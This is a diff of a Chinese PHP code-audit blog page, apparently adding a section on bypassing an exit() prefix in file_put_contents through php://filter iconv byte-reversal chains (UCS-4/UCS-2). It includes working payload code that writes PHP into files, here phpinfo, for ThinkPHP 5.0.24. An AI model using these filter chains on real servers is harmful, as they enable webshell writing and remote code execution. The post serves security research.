@@ -43,8 +43,9 @@
 <meta property="og:image" content="https://i.loli.net/2020/04/02/GTjMDAu63SXwCLc.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/01/ZON2BfjIqbeLzVl.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/01/nXLiyVHCJbwK2WT.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/02/tgPZOdVpl87Nn6X.png">
 <meta property="article:published_time" content="2020-04-01T01:50:42.000Z">
-<meta property="article:modified_time" content="2020-04-02T07:58:56.844Z">
+<meta property="article:modified_time" content="2020-04-02T12:17:03.060Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="php代码审计">
 <meta name="twitter:card" content="summary">
@@ -181,6 +182,23 @@
 <h4><span id="demo3">demo3</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $payload&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;xaaPD9waHAgcGhwaW5mbygpOyAgPz4g&#x2F;..&#x2F;a.php&#39;;</span><br><span class="line">    $filename&#x3D;$payload.&#39;468bc8d30505000a2d7d24702b2cda94.php&#39;;</span><br><span class="line">    $data&#x3D;&quot;&lt;?php\n&#x2F;&#x2F;000000000000\n exit();?&gt;\n&quot;.serialize($payload.&#39;647c4f96a28a577173d6e398eefcc3fe.php&#39;);</span><br><span class="line">    file_put_contents($filename, $data);</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2020/04/01/nXLiyVHCJbwK2WT.png" alt="Snipaste_2020-04-01_11-12-03.png"></p>
+<p>=====================分割线4/2</p>
+<p>今天看了p牛推了一篇文章：<a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA" target="_blank" rel="noopener">一次“SSRF–&gt;RCE”的艰难利用</a></p>
+<p>里面提到了tp5.0.24开启短标签情况下（rot13会导致语法错误）时的解决办法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-4LE.UCS-4BE&#x2F;resource&#x3D;abcd</span><br></pre></td></tr></table></figure>
+
+<p> 函数会将目标4位一反转,从而绕过短标签。 </p>
+<p>如果仍然写入为空，很有可能设置了php strict模式， </p>
+<blockquote>
+<p>关键文件的总字符数不能被4整除(除后余2，如果添加2字符，则写入数据不能正常显示为shell)导致写入为空。 </p>
+</blockquote>
+<p>可以利用下面的方法2位一反转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;xxxx</span><br></pre></td></tr></table></figure>
+
+<p>举例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo iconv(&#39;UCS-2LE&#39;, &#39;UCS-2BE&#39;, &quot;&lt;?php phpinfo();?&gt;&quot;);</span><br><span class="line">    $payload&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;?&lt;hp phpipfn(o;)&gt;?&#39;;</span><br><span class="line">    $filename&#x3D;$payload.&#39;468bc8d30505000a2d7d24702b2cda94.php&#39;;</span><br><span class="line">    $data&#x3D;&quot;&lt;?php\n&#x2F;&#x2F;000000000000\n exit();?&gt;\n&quot;.serialize($payload.&#39;647c4f96a28a577173d6e398eefcc3fe.php&#39;);</span><br><span class="line">    file_put_contents($filename, $data);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/04/02/tgPZOdVpl87Nn6X.png" alt="Snipaste_2020-04-02_20-15-23.png"></p>
 <h4><span id="参考链接">参考链接</span></h4><p> <a href="https://xz.aliyun.com/t/7457" target="_blank" rel="noopener">https://xz.aliyun.com/t/7457</a></p>
 
             </div>
